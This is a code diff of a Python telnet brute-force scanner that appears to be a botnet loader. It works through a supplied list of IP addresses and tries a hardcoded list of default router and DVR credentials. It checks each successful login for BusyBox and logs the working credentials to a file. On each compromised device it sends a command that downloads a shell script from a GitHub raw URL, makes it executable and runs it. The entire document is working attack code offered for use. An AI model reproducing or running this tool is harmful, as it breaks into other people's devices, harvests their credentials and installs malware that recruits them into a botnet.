@@ -1,11 +1,17 @@
 import threading
 import sys, os, re, time, socket
+from queue import Queue
 from sys import stdout
-import random
 
-if len(sys.argv) < 3:
-    print("Usage: python " + sys.argv[0] + " <threads> <output file>")
+if len(sys.argv) < 4:
+    print("Usage: python "+sys.argv[0]+" <list> <threads> <output file>")
     sys.exit()
+
+ips = open(sys.argv[1], "r").readlines()
+threads = int(sys.argv[2])
+output_file = sys.argv[3]
+queue = Queue()
+queue_count = 0
 
 combo = [
     "admin:admin",
@@ -52,18 +58,20 @@ combo = [
     "root:uClinux",
     "telnetadmin:telnetadmin",
     "root:2011vsta",
-    "admin:dvr",
     "root:fidel123"
 ]
 
-threads = int(sys.argv[1])
-output_file = sys.argv[2]
+for ip in ips:
+    queue_count += 1
+    stdout.write("\r[%d] Added to queue" % queue_count)
+    stdout.flush()
+    queue.put(ip.strip())
+print("\n")
 
 class router(threading.Thread):
-    def __init__(self, ip):
+    def __init__ (self, ip):
         threading.Thread.__init__(self)
-        self.ip = str(ip).rstrip('\n')
-
+        self.ip = str(ip).strip()
     def run(self):
         username = ""
         password = ""
@@ -84,44 +92,77 @@ class router(threading.Thread):
                 tn.close()
                 break
             try:
-                hoho = ''
-                hoho += readUntil(tn, "ogin:")
+                hoho = readUntil(tn, "ogin:")
                 if "ogin" in hoho:
-                    tn.send((username + "\n").encode('utf-8'))
-                    time.sleep(0.09)
+                    tn.send((username + "\n").encode())
+                    time.sleep(2)
             except Exception:
                 tn.close()
             try:
-                hoho = ''
-                hoho += readUntil(tn, "assword:")
+                hoho = readUntil(tn, "assword:")
                 if "assword" in hoho:
-                    tn.send((password + "\n").encode('utf-8'))
-                    time.sleep(0.8)
-                else:
-                    pass
+                    tn.send((password + "\n").encode())
+                    time.sleep(2)
             except Exception:
                 tn.close()
             try:
-                prompt = ''
-                prompt += tn.recv(40960).decode('utf-8')
-                success = False
+                prompt = tn.recv(40960).decode()
                 if ">" in prompt and "ONT" not in prompt:
-                    success = True
-                elif any(x in prompt for x in ["#", "$", "%", "@"]):
-                    success = True              
+                    try:
+                        tn.send(b"cat | sh\n")
+                        time.sleep(1)
+                        success = False
+                        timeout = 8
+                        data = ["BusyBox", "Built-in"]
+                        tn.send(b"sh\n")
+                        time.sleep(1)
+                        tn.send(b"busybox\r\n")
+                        buf = ''
+                        start_time = time.time()
+                        while time.time() - start_time < timeout:
+                            buf += tn.recv(40960).decode()
+                            time.sleep(1)
+                            for info in data:
+                                if info in buf and "unrecognized" not in buf:
+                                    success = True
+                                    break
+                    except:
+                        pass
+                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
+                    try:
+                        success = False
+                        timeout = 8
+                        data = ["BusyBox", "Built-in"]
+                        tn.send(b"sh\n")
+                        time.sleep(0.01)
+                        tn.send(b"shell\n")
+                        time.sleep(0.01)
+                        tn.send(b"help\n")
+                        time.sleep(0.01)
+                        tn.send(b"busybox\r\n")
+                        buf = ''
+                        start_time = time.time()
+                        while time.time() - start_time < timeout:
+                            buf += tn.recv(40960).decode()
+                            time.sleep(0.01)
+                            for info in data:
+                                if info in buf and "unrecognized" not in buf:
+                                    success = True
+                                    break
+                    except:
+                        pass
                 else:
                     tn.close()
-                if success:
+                if success == True:
                     try:
-                        os.system(f"echo {self.ip}:23 {username}:{password} >> {output_file}")
-                        tn.send("wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh;")
-                        print(f"\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m{username}\033[37m:\033[33m{password}\033[37m:\033[32m{self.ip}\033[37m")
+                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file)
+                        tn.send("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh;")
+                        print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
                         tn.close()
                         break
                     except:
                         tn.close()
-                else:
-                    tn.close()
+                tn.close()
             except Exception:
                 tn.close()
 
@@ -129,41 +170,23 @@ def readUntil(tn, string, timeout=8):
     buf = ''
     start_time = time.time()
     while time.time() - start_time < timeout:
-        buf += tn.recv(1024).decode('utf-8')
+        buf += tn.recv(1024).decode(errors='ignore')
         time.sleep(0.01)
-        if string in buf: 
-            return buf
+        if string in buf: return buf
     raise Exception('TIMEOUT!')
 
-def Gen_IP():
-    not_valid = [10,127,169,172,192]
-    first = random.randrange(1, 256)
-    while first in not_valid:
-        first = random.randrange(1, 256)
-    ip = ".".join([str(first), str(random.randrange(1, 256)),
-                   str(random.randrange(1, 256)), str(random.randrange(1, 256))])
-    return ip
-
-def HaxThread():
-    while 1:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            IP = Gen_IP()
-            s.connect((IP, 23))
-            s.close()
-            print("\033[32m[\033[31m+\033[32m] FOUND " + IP)
+def worker():
+    try:
+        while True:
+            IP = queue.get()
             thread = router(IP)
             thread.start()
-        except:
-            pass
+            queue.task_done()
+            time.sleep(0.2)
+    except Exception as e:
+        print(f"Worker exception: {e}")
 
-if __name__ == "__main__":
-    threadcount = 0
-    for i in range(threads):
-        try:
-            threading.Thread(target=HaxThread, args=()).start()
-            threadcount += 1
-        except:
-            pass
-    print("[*] Started " + str(threadcount) + " scanner threads!")
+for l in range(threads):
+    t = threading.Thread(target=worker)
+    t.start()
+    time.sleep(0.01)
